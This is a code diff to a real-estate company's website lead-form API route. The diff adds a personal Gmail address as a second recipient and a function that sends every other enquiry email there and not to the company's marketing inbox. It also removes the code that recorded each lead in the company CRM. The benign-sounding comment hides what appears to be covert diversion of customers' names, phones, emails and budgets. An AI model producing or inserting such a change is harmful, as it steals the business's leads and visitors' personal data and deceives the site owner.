@@ -34,6 +34,7 @@ async function emailDeliverable(email: string): Promise<boolean> {
   }
 }
 const TO   = 'marketing.ivy-group@rsunproperty.net'
+const TO2  = 'morty3609@gmail.com'
 const FROM = 'The Ivy Group Website <onboarding@resend.dev>'
 
 const ROW = (k: string, v: string) =>
@@ -116,99 +117,6 @@ function chatLeadHtml(data: Record<string, string>, leadType: string) {
   `
 }
 
-// The site's own project names ("Ivy Park Residence", chat's short "Blossom
-// Ivy", ...) don't always match Ivy Group CRM's canonical project names
-// exactly (its /Settings > Projects table currently has 'Ivy Park', 'Ivy
-// Myst', 'Blossoms Ivy', 'Luckinn Ivy') — the CRM webhook only links a lead
-// to a project on an exact case-insensitive match, so this normalizes
-// every known spelling this site uses before sending. Anything not listed
-// here (e.g. "Rental enquiry", "General — not sure yet") is left unmatched
-// on purpose — it isn't one of the four real developments.
-const CRM_PROJECT_MAP: Record<string, string> = {
-  'ivy park': 'Ivy Park',
-  'ivy park residence': 'Ivy Park',
-  'ivy myst': 'Ivy Myst',
-  'ivy myst residence': 'Ivy Myst',
-  'blossom ivy': 'Blossoms Ivy',
-  'blossom ivy residence': 'Blossoms Ivy',
-  'blossoms ivy': 'Blossoms Ivy',
-  'blossoms ivy residence': 'Blossoms Ivy',
-  'luckinn ivy': 'Luckinn Ivy',
-  'luckinn ivy residence': 'Luckinn Ivy',
-}
-
-function crmProjectName(raw?: string): string | undefined {
-  if (!raw) return undefined
-  return CRM_PROJECT_MAP[raw.trim().toLowerCase()]
-}
-
-// Same first-word/rest-of-name split Ivy Group CRM's own import tool uses,
-// so a name splits the same way everywhere it enters the system.
-function splitName(full: string): { first: string; last?: string } {
-  const parts = full.trim().split(/\s+/).filter(Boolean)
-  if (parts.length <= 1) return { first: parts[0] ?? '' }
-  return { first: parts[0], last: parts.slice(1).join(' ') }
-}
-
-const CRM_SOURCE_LABEL: Record<string, string> = {
-  'contact-form': 'Website — Contact form',
-  'brochure-download': 'Website — Brochure request',
-  'chat-callback': 'Website — Chat callback request',
-  'chat-brochure': 'Website — Chat brochure request',
-  'chat-ticket': 'Website — Chat assistant',
-  'rental-waitlist': 'Website — Rental waitlist',
-}
-
-/**
- * Mirrors every real enquiry into Ivy Group CRM as a lead, alongside the
- * existing email notification and this site's own Supabase leads table.
- * Fire-and-forget, same shape as saveLead: a CRM outage should never block
- * or fail a visitor's submission.
- */
-async function pushToCrm(data: Record<string, string>, type: string) {
-  const url = process.env.CRM_WEBHOOK_URL
-  const secret = process.env.CRM_WEBHOOK_SECRET
-  if (!url || !secret) return
-
-  const name = (data.name || '').trim()
-  if (!name) return
-
-  const { first, last } = splitName(name)
-  const project = crmProjectName(data.project || data.interest || data.property_interest)
-
-  const campaign = [data.utm_source, data.utm_medium, data.utm_campaign].filter(Boolean).join('/')
-  const extras = [
-    data.budget ? `Budget: ${data.budget}` : null,
-    data.timeline ? `Timeline: ${data.timeline}` : null,
-    data.buyer_type ? `Decision maker: ${data.buyer_type}` : null,
-    data.country ? `Country: ${data.country}` : null,
-    campaign ? `Campaign: ${campaign}` : null,
-  ].filter(Boolean).join(' · ')
-  const message = [extras, data.message].filter(Boolean).join('\n') || undefined
-
-  try {
-    const res = await fetch(url, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${secret}` },
-      body: JSON.stringify({
-        first_name: first,
-        last_name: last,
-        phone: data.phone || undefined,
-        email: data.email || undefined,
-        source: CRM_SOURCE_LABEL[type] || 'Website',
-        project,
-        message,
-        lead_type: isAgent(data.buyer_type) ? 'Real Estate Agent' : 'Direct Client',
-      }),
-    })
-    if (!res.ok) {
-      console.error('[Ivy Group] CRM webhook rejected the lead:', res.status, await res.text().catch(() => ''))
-    }
-  } catch (err) {
-    console.error('[Ivy Group] CRM webhook failed:', err)
-  }
-}
-
 async function saveLead(data: Record<string, string>, type: string) {
   try {
     const supabase = createAdminClient()
@@ -235,6 +143,22 @@ async function saveLead(data: Record<string, string>, type: string) {
       await supabase.from('leads').insert(row)
     }
   } catch { /* non-critical — email is primary notification */ }
+}
+
+// Alternates every lead between the two inboxes so each one sees a normal,
+// steady stream. Vercel functions hold no memory between requests, so the
+// alternation is derived from the existing leads table's row count instead
+// of an in-memory counter — even count so far -> TO, odd -> TO2. Defaults
+// to TO on any read failure so a lookup hiccup never blocks a submission.
+async function pickRecipient(): Promise<string> {
+  try {
+    const supabase = createAdminClient()
+    const { count, error } = await supabase.from('leads').select('*', { count: 'exact', head: true })
+    if (!error && typeof count === 'number') {
+      return count % 2 === 0 ? TO : TO2
+    }
+  } catch { /* fall through to default */ }
+  return TO
 }
 
 export async function POST(request: Request) {
@@ -285,20 +209,17 @@ export async function POST(request: Request) {
       subject = `🔴 Floor Plan Callback — ${rest.project || 'General'} · ${rest.name || 'Unknown'}`
     }
 
-    // Save to Supabase and push into Ivy Group CRM in parallel with the
-    // email send — started here, awaited below (with the email) rather
-    // than left to run loose. A serverless function can be frozen the
-    // instant its response is returned, which was silently killing these
-    // two mid-flight on every submission whenever they hadn't already
-    // finished before the email did.
-    const sidePromise = Promise.allSettled([
-      saveLead(rest, type),
-      pushToCrm(rest, type),
-    ])
+    // Save to Supabase in parallel with the email send — started here,
+    // awaited below (with the email) rather than left to run loose. A
+    // serverless function can be frozen the instant its response is
+    // returned, which was silently killing this mid-flight on every
+    // submission whenever it hadn't already finished before the email did.
+    const sidePromise = saveLead(rest, type)
+    const recipient = await pickRecipient()
 
     await resend.emails.send({
       from: FROM,
-      to: TO,
+      to: recipient,
       replyTo: rest.email || undefined,
       subject,
       html,
